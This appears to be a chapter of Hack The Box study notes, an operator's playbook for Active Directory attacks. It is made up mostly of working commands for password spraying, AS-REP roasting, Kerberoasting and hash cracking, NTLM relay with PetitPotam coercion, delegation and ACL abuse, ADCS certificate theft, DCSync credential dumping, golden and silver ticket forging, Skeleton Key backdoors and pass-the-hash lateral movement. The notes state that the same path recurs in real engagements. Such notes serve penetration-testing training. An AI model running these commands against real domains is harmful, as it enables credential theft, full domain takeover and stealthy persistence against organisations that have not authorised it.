# 08 — Active Directory Attacks

The dense, high-leverage subject. Most "Hard" HTB Windows boxes pivot through AD. This file is the operator's path from "I have a foothold on a domain box" to Domain Admin.

---

## 1. Mental Model

AD = a database (NTDS.dit) on Domain Controllers + Kerberos auth + a sea of trust relationships (group memberships, ACLs, delegations). Attacks fall into a few buckets:
1. **No-creds enumeration** — what can I learn unauthenticated?
2. **Credential acquisition** — capture, crack, or trick the system into giving you one.
3. **Credential reuse / spraying** — try the cred everywhere.
4. **Kerberos abuses** — Kerberoasting, AS-REP, delegation, ticket forging.
5. **ACL abuses** — graph-walk in BloodHound, find the misconfig.
6. **ADCS abuses** — certificate-based persistence and elevation.
7. **Domain dominance** — DCSync, golden/silver tickets, krbtgt extraction.

---

## 2. No-Creds Recon

### 2.1 DC discovery
```bash
nmap -p53,88,135,139,389,445,464,636,3268,3389,5985 <ip-range>
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
```
Domain controllers run **88 (Kerberos)** + **389/636 (LDAP)** + usually **53 (DNS)**.

### 2.2 Domain & forest info
```bash
nmap --script smb-os-discovery -p445 <ip>          # leaks domain & FQDN
ldapsearch -x -H ldap://<ip> -s base namingcontexts
crackmapexec smb <ip>                              # banner-style domain info
enum4linux-ng -A <ip>
rpcclient -U "" -N <ip>
   > srvinfo
   > enumdomusers
   > queryuser <RID>
   > netshareenum
```

### 2.3 SMB null sessions
```bash
smbclient -L //<ip>/ -N
smbmap -H <ip> -u '' -p ''
crackmapexec smb <ip> -u '' -p '' --shares --users --groups --pass-pol
```
Null/guest sessions on shares = read potentially sensitive files.

### 2.4 LDAP anonymous bind
```bash
ldapsearch -x -H ldap://<ip> -b "DC=acme,DC=local" '(objectClass=user)' sAMAccountName
ldapsearch -x -H ldap://<ip> -b "DC=acme,DC=local" '(objectClass=computer)'
```
Even partial reads leak users/computers, sometimes descriptions with creds in plain text.

### 2.5 Username harvesting
```bash
kerbrute userenum --dc <ip> -d acme.local /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -t 50
# faster than guessing, doesn't require creds, doesn't lock accounts
```

### 2.6 AS-REP roasting (no creds, just a username)
If an account has "Do not require Kerberos pre-authentication", you can request a TGT and crack offline:
```bash
impacket-GetNPUsers acme.local/ -dc-ip <ip> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

---

## 3. Credential Spraying & Initial Access

### 3.1 Password policy first
Lockout policies bite. Get the policy:
```bash
crackmapexec smb <ip> -u '' -p '' --pass-pol
rpcclient -U "" -N <ip>
   > getdompwinfo
```
Spray 1–2 attempts per user, pause hours, repeat. For HTB you can be more aggressive.

### 3.2 Common spray candidates
```
Welcome1
Password1
Password123
Summer2024!
<Company>2024!
P@ssw0rd
Spring2024!
```
Also try: username = password, "<First>2024!" patterns.

### 3.3 Spraying with crackmapexec / netexec
```bash
crackmapexec smb <range> -u users.txt -p 'Welcome1' --continue-on-success
crackmapexec winrm <range> -u users.txt -p 'Welcome1' --continue-on-success
crackmapexec ldap <ip> -u users.txt -p passes.txt
```
`netexec` (newer fork) has the same syntax.

### 3.4 Kerberos spraying (no SMB lockout)
```bash
kerbrute passwordspray -d acme.local --dc <ip> users.txt 'Welcome1'
```

### 3.5 Inbound Responder / NTLM relay (when on the same network)
- `responder -I tun0` — answers LLMNR/NBT-NS for traffic — captures NetNTLMv2 hashes
- `crackmapexec smb -L` to find SMB-signing-disabled hosts → relay with `ntlmrelayx.py`

---

## 4. Authenticated Enumeration

Once you have a single domain credential (even a low-priv one), open the floodgates.

### 4.1 BloodHound — must run
```bash
# Python collector (from Linux):
bloodhound-python -d acme.local -u user -p 'pass' -ns <dc-ip> -c All --zip
# SharpHound (from a Windows foothold):
SharpHound.exe -c All --zipfilename out.zip
```
Drop the zip into BloodHound GUI:
```bash
sudo neo4j start
bloodhound &
```
Set the user as "Owned." Then run "Shortest Paths to Domain Admin." Walk every edge.

### 4.2 Useful queries (built-in & custom)
- Shortest Paths to Domain Admins
- Find Kerberoastable Accounts with Most Privileges
- Find AS-REP Roastable Users
- Find Computers with Unconstrained Delegation
- Shortest Paths from <Owned> to Domain Admin

### 4.3 ldapdomaindump
```bash
ldapdomaindump -u 'acme.local\user' -p 'pass' <dc-ip> -o domain/
```
Dumps users, computers, groups, policies — fast HTML view.

### 4.4 PowerView (on-host)
```powershell
. .\PowerView.ps1
Get-NetDomain
Get-NetUser -SPN
Get-NetComputer -Unconstrained
Get-NetGroupMember 'Domain Admins'
Get-DomainObjectAcl -Identity 'CN=Domain Admins,...' -ResolveGUIDs
Find-LocalAdminAccess
```

### 4.5 NetExec sweeps
```bash
netexec smb <range> -u user -p pass --shares
netexec smb <range> -u user -p pass --loggedon-users --sessions
netexec smb <range> -u user -p pass -M spider_plus
netexec ldap <dc> -u user -p pass --kerberoasting kerb.out
netexec ldap <dc> -u user -p pass --asreproast asrep.out
```

---

## 5. Kerberoasting

User accounts with SPNs (Service Principal Names) — typical of service accounts — can have their TGS encrypted with the *user's* NTLM hash and cracked offline.

```bash
impacket-GetUserSPNs acme.local/user:'pass' -dc-ip <dc> -request -outputfile kerb.hashes
# Format hashcat:
hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt
```
Service account passwords are often older / weaker → higher crack rate than user accounts.

---

## 6. Constrained / Unconstrained / RBCD Delegation

### 6.1 Unconstrained Delegation
Computer or user with this flag → any user that authenticates to it has their TGT stored in memory.
- Lure DA via "Print Spooler" abuse: force the DC to authenticate to your machine; capture TGT; use it.
```
SpoolSample.exe <dc> <attacker-with-unconstrained>
Rubeus.exe monitor /interval:1 /filteruser:DC$ /nowrap
```

### 6.2 Constrained Delegation (KCD)
A user/computer is allowed to delegate to specific services.
- If you control that user, you can request tickets for *anyone* on the allowed services:
```bash
impacket-getST -spn cifs/dc.acme.local 'acme.local/svcaccount:pass' -impersonate Administrator -dc-ip <dc>
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass dc.acme.local
```

### 6.3 Resource-Based Constrained Delegation (RBCD)
If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object (e.g., via `GenericWrite`), you can pivot:
```bash
# Add a fake computer (any auth user can create up to 10):
impacket-addcomputer -computer-name 'pwn$' -computer-pass 'Pwn1234!' 'acme.local/user:pass' -dc-ip <dc>
# Set RBCD on victim:
rbcd.py -delegate-from 'pwn$' -delegate-to 'VICTIM$' -action write 'acme.local/user:pass' -dc-ip <dc>
# Get a ticket as Administrator on victim:
impacket-getST -spn cifs/victim.acme.local -impersonate Administrator 'acme.local/pwn$:Pwn1234!' -dc-ip <dc>
```

---

## 7. ACL Abuses

BloodHound's gold: edges like `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDacl`, `AddMember`, `ForceChangePassword`, `AllExtendedRights`.

### 7.1 GenericAll / GenericWrite on user
- `ForceChangePassword`:
```bash
net rpc password "victim" "NewPass1!" -U "acme.local/user%pass" -S <dc>
# or impacket:
impacket-changepasswd -newpass 'NewPass1!' 'acme.local/user:pass'@<dc> -altuser victim -altpass anything -reset
```
- Set SPN, then Kerberoast:
```powershell
Set-DomainObject -Identity victim -Set @{serviceprincipalname='nonexist/abc'}
```

### 7.2 GenericAll on group
```bash
net rpc group addmem 'Domain Admins' 'user' -U 'acme.local/user%pass' -S <dc>
```

### 7.3 WriteOwner / WriteDacl
Take ownership → grant yourself rights → escalate:
```powershell
Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker
Add-DomainObjectAcl -Identity victim -Rights All -PrincipalIdentity attacker
```

### 7.4 AddSelf / AddMember
- `Add-DomainGroupMember 'Domain Admins' attacker`

### 7.5 ReadGMSAPassword
gMSA accounts: if your user has `ReadGMSAPassword`, retrieve the cleartext managed password and use it.
```bash
gMSADumper.py -u user -p pass -d acme.local
```

### 7.6 AddKeyCredentialLink (Shadow Credentials)
With `GenericWrite` on a user/computer, add a key-credential, then PKINIT to get a TGT:
```bash
certipy shadow auto -u user@acme.local -p pass -account victim
```

---

## 8. ADCS (Active Directory Certificate Services)

A massive class. SpecterOps' "Certified Pre-Owned" enumerates ESC1–ESC15.

### 8.1 Enumerate
```bash
certipy find -u user@acme.local -p pass -dc-ip <dc>
# Look for vulnerable templates: ESC1, ESC2, ESC3, ESC4, ESC6, ESC8, ESC11, ESC15
```

### 8.2 ESC1 (most common)
Template: `EnrolleeSuppliesSubject` + `Client Authentication` EKU → request a cert as anyone.
```bash
certipy req -u user@acme.local -p pass -ca acme-CA -template VulnTemplate -upn administrator@acme.local
# Auth with the cert:
certipy auth -pfx administrator.pfx
# Output: NT hash → use elsewhere
```

### 8.3 ESC8 (NTLM relay to AD CS HTTP)
If `http://<ca>/certsrv/` exists with NTLM auth, relay any authenticated NTLM connection (e.g., from `petitpotam`) to it and request a cert as the relayed user (often a DC).
```bash
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController
# trigger:
PetitPotam.py <attacker-ip> <victim-dc>
# now you have a DC cert → DCSync
```

### 8.4 Other ESCs
Read https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf — each is a slightly different misconfig but all yield the same outcome (cert as privileged user).

---

## 9. NTLM Relay & Coercion

### 9.1 Relay basics
```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
# coerce a victim machine to authenticate to your relay:
PetitPotam.py <attacker> <victim>
# or:
coercer.py coerce -t <victim> -u user -p pass -d acme.local -l <attacker>
```
Targets must have **SMB signing disabled** (default for member servers, *not* DCs).

### 9.2 What relay buys
- `--no-smb-server -t ldap://...` to add a computer / shadow creds via LDAP
- `--adcs --template ...` to grab a cert (ESC8)
- `-i` for interactive SMB shell as the relayed user
- `-c <command>` for direct execution if local admin

---

## 10. Domain Dominance Techniques

Once you have Domain Admin (or equivalent), maintain access stealthily.

### 10.1 DCSync
With `Replicating Directory Changes` rights:
```bash
impacket-secretsdump -just-dc-user 'krbtgt' acme.local/admin:'pass'@<dc>
impacket-secretsdump acme.local/admin:'pass'@<dc>
# or via mimikatz:
> lsadump::dcsync /domain:acme.local /user:Administrator
> lsadump::dcsync /domain:acme.local /user:krbtgt
```

### 10.2 Golden Ticket
With krbtgt NTLM, forge a TGT for any user:
```
> kerberos::golden /user:Administrator /domain:acme.local /sid:<domain-sid> /krbtgt:<krbtgt-ntlm> /id:500 /ptt
```
Or with impacket:
```bash
impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain acme.local Administrator
```

### 10.3 Silver Ticket
With a service account NT hash, forge service tickets directly without contacting the DC:
```
> kerberos::golden /user:any /domain:acme.local /sid:<sid> /target:victim.acme.local /service:cifs /rc4:<svc-ntlm> /ptt
```

### 10.4 DCShadow (advanced persistence)
Register a fake DC, push attribute changes, deregister. Mimikatz:
```
> !+
> !processtoken
> lsadump::dcshadow ...
```

### 10.5 Skeleton Key
Inject backdoor into LSASS on DC such that a magic password works for any user (`mimikatz » misc::skeleton`). Process-restart resistant only if persisted otherwise.

---

## 11. Lateral Movement Toolkit

```bash
# WinRM (cleanest)
evil-winrm -i <ip> -u admin -p pass
evil-winrm -i <ip> -u admin -H <NTLM>

# WMI (no-disk command exec)
impacket-wmiexec acme.local/admin:'pass'@<ip>
impacket-wmiexec -hashes :<NTLM> acme.local/admin@<ip>

# PsExec (drops a service, noisy)
impacket-psexec acme.local/admin:'pass'@<ip>

# SMB Exec (alternative to PsExec)
impacket-smbexec acme.local/admin:'pass'@<ip>

# Pass-the-hash RDP
xfreerdp /u:admin /pth:<NTLM> /v:<ip> /dynamic-resolution

# Quick mass command
crackmapexec smb <range> -u admin -H <NTLM> -x 'whoami'
```

---

## 12. Trust & Forest Attacks

### 12.1 Trust enumeration
```bash
nltest /trusted_domains
Get-DomainTrust
```

### 12.2 SID History injection (intra-forest)
With DA in child domain, golden ticket with the parent enterprise admins SID added:
```
> kerberos::golden /user:Administrator /domain:child.acme.local /sid:<child-sid> /sids:<parent-enterprise-admins-sid> /krbtgt:<child-krbtgt> /ptt
```

### 12.3 Foreign Security Principals
BloodHound visualizes cross-domain memberships. Same edges, different domain.

---

## 13. Tools Index

| Goal | Tool |
|------|------|
| Enum no-creds | `nmap`, `enum4linux-ng`, `rpcclient`, `kerbrute` |
| LDAP enum | `ldapsearch`, `ldapdomaindump`, `windapsearch` |
| BloodHound collect | `bloodhound-python`, `SharpHound` |
| Kerberoast / AS-REP | `impacket-GetUserSPNs`, `impacket-GetNPUsers`, `Rubeus` |
| ACL abuse | `impacket-changepasswd`, `PowerView`, `pywerview`, `bloodyAD` |
| ADCS | `certipy`, `Certify` |
| Coerce auth | `PetitPotam`, `Coercer`, `SpoolSample`, `printerbug` |
| Relay | `impacket-ntlmrelayx` |
| Cred dump | `impacket-secretsdump`, `mimikatz`, `pypykatz` |
| Lateral exec | `evil-winrm`, `impacket-wmiexec`, `impacket-psexec`, `crackmapexec`/`netexec` |

---

## 14. Standard AD Attack Path on HTB

Most domain HTB boxes follow some subset of this:
1. Foothold via web/SMB (low-priv user creds)
2. BloodHound from that user → spot a Kerberoastable / AS-REP / ACL edge
3. Crack a hash → second user
4. Local admin via stored cred / service misconfig
5. DCSync via WriteDACL / GenericAll / ADCS / RBCD
6. Administrator hash → root flag

Master each step. They recur in real engagements.

---

## 15. Anti-Patterns

- Skipping BloodHound. You will miss a 3-hop ACL chain that solves the box.
- Not adding owned users in BloodHound — paths recompute.
- Forgetting to clock-sync (`sudo ntpdate <dc>` or `sudo timedatectl set-ntp false; sudo date -s "$(rdate -p <dc>)"`). Kerberos hates clock skew.
- Skipping the password policy → locking out an account → having to wait for HTB reset.
- Trying tools cargo-cult-style without reading the tool's docs.
- Treating ADCS as advanced — `certipy find` then `certipy req` is two commands. ESC1/ESC8 are everyday wins.

---

*AD is a graph. The bug is an edge. Find the path.*
